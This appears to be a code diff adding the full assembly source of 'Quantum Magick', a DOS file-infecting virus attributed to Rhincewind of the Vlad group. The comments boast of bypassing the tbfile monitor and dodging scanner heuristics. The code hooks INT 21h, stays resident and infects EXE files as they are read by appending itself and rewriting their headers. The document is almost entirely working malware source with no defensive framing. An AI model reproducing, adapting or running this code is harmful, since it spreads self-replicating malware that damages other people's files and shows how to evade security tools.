@@ -1,0 +1,223 @@
+
+; Quantum Magick, a laboratory specimen by Rhincewind [Vlad]
+;
+; This is a bit of my older work. Quantum Magick demonstrates the use of
+; SFT's to infect programs on file read, which happens to circumvent
+; tbfile if it was the command interpreter that originally opened the file.
+;
+; Some of the code in here has high embarrassment potential, such as the 
+; kludgey fragment used to avoid the Darth Vader scanstring and heuristics,
+; not to mention the use of the jumps directive. Ouch.
+;
+; The more-than-necessary use of memory pushes and pops and exchanges 
+; involving the memory banks are just because I felt like it. 
+;
+; And that's that.
+
+                .model tiny
+                .code
+                jumps
+                org 0h
+
+start:
+                push ds
+                push es
+installation_check:
+                mov ah, 30h
+                int 21h
+                cmp bh,30h
+                jz no_install
+                cmp al,3
+                jb no_install
+allocate_memory:
+                push es
+                pop ax
+                dec ax
+                push ax
+                pop ds
+                xor si,si
+                lodsb
+                xor al, 'Z'
+                jnz abort_install
+                add word ptr ds:[si+2], -parasize
+                add word ptr ds:[si+11h], -parasize
+copy_code:
+                mov es, word ptr ds:[si+11h]
+                push cs
+                call next
+next:
+                pop si
+                pop ds
+                sub si, offset (next-start)
+                mov cx, (endvirus-start)
+                xor di,di
+                rep movsb
+hook_int:                
+                push cx
+                pop ds
+                cli
+                mov ax, offset handler
+                xchg ax, word ptr ds:[84h]
+                stosw
+                mov ax,es
+                xchg ax, word ptr ds:[86h]
+                stosw
+                sti
+abort_install:
+no_install:
+                pop es
+                pop ds
+                mov bx,ds
+                add bx,10h
+                call next2
+next2:
+                pop si
+                add bx, word ptr cs:[si+(_cs-next2)]
+                push bx
+                push word ptr cs:[si+(_ip-next2)]
+                xor ax,ax
+                xor bx,bx
+                xor cx,cx
+                xor dx,dx
+                xor si,si
+                xor di,di
+                retf
+handler:
+                cmp ah, 3fh
+                jz viruzz
+                cmp ah, 30h
+                jnz no_chk
+                push ax
+                call call_int21
+                pop bx
+                retf 2
+
+plate           db 'Quantum Magick'
+
+no_chk:
+                jmp dword ptr cs:int21offset
+viruzz:
+                cmp bl,5
+                jb no_chk
+                call call_int21
+                pushf
+                cmp ax, 18h
+                jb not_enough_bytes_read
+                push si
+                push ax
+                push cx
+                push dx
+                push di
+                push ds
+                push bx
+                push ax
+get_sft_address:
+                mov si, 1220h
+                xchg si,ax
+                int 2fh
+                mov si, 1216h
+                mov bl, byte ptr es:[di]
+                xchg si,ax
+                int 2fh
+                xor si,si
+                pop ax
+                mov bx,dx
+                xchg ax,cx
+                call getlen
+                sub ax, cx
+                jnz no_start_read
+                sbb dx, ax
+                jnz no_start_read
+start_read:
+                mov ax, 'ZM'
+                xor ax, word ptr ds:[bx]
+                jnz exit_read
+                cmp word ptr ds:[bx+18h], 40h
+                jz exit_read
+                cmp word ptr ds:[bx+1ah],si
+                jnz exit_read
+                cmp word ptr ds:[bx+0ch],si
+                jz exit_read
+                call getlen
+                mov cx, 10h                     ;Filesize div 16.
+                div cx
+                sub ax, word ptr ds:[bx+8]
+                xchg word ptr ds:[bx+14h], dx    ;=CS:IP pair..
+                xchg word ptr ds:[bx+16h], ax
+                mov cs:_cs,ax
+                mov cs:_ip,dx
+                mov cl,5
+                shr ax,cl
+                neg ax
+                add ax, word ptr ds:[bx+4]
+                cmp al,5
+                jb exit_read
+                call getlen
+                add ax, (endvirus-start)
+                adc dx, si
+                mov cx, 200h
+                div cx
+                or dx,dx
+                jz no_hiccup
+                inc ax
+no_hiccup:
+                mov word ptr ds:[bx+4],ax
+                mov word ptr ds:[bx+2],dx
+endcalc:
+                mov dx,bx
+                pop bx
+                push word ptr es:[di+2]
+                push word ptr es:[di+15h]
+                push word ptr es:[di+17h]
+                mov byte ptr es:[di+2],2
+                mov word ptr es:[di+15h], 2
+                mov word ptr es:[di+17h], si
+                mov ah, 40h
+                mov cx, 18h
+                inc dx
+                inc dx
+                int 21h
+                call getlen
+                mov word ptr es:[di+15h], ax
+                mov word ptr es:[di+17h], dx
+                mov ah, 40h
+                push cs
+                pop ds
+                mov cx, (endvirus-start)
+                xor dx,dx
+                int 21h
+                pop word ptr es:[di+17h]
+                pop word ptr es:[di+15h]
+                pop word ptr es:[di+2]
+                jmp after_file_access
+no_start_read:
+exit_read:
+                pop bx
+after_file_access:
+                pop ds
+                pop di
+                pop dx
+                pop cx
+                pop ax
+                pop si
+not_enough_bytes_read:                
+                popf
+                retf 2
+getlen:
+                mov ax, word ptr es:[di+11h]
+                mov dx, word ptr es:[di+13h]
+                ret
+_cs             dw 0fff0h
+_ip             dw 0
+call_int21:
+                pushf
+                call dword ptr cs:int21offset
+                ret
+endvirus:
+int21offset     dw ?
+int21seg        dw ?
+parasize        equ ((endvirus-start)/16)+2
+                
+                end start
+
+
